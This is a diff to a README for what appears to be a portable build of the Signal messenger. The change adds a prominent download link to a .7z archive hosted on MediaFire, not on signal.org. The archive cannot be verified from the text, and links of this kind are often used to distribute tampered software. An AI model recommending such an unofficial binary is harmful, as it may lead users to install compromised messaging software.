@@ -6,6 +6,8 @@ The original release used the PortableApps.com format, which worked by physicall
 
 This new version avoids that risk entirely by using **symlinks** to handle data, greatly improving reliability and stability. Also included is a built-in updater that automatically fetches the latest Signal release directly from signal.org.
 
+### 📦 [**DOWNLOAD Signal Portable**](https://www.mediafire.com/file/2xizsbd87bfr98i/SignalPortable.7z/file)
+
 ---
 
 ## 🔄 Features
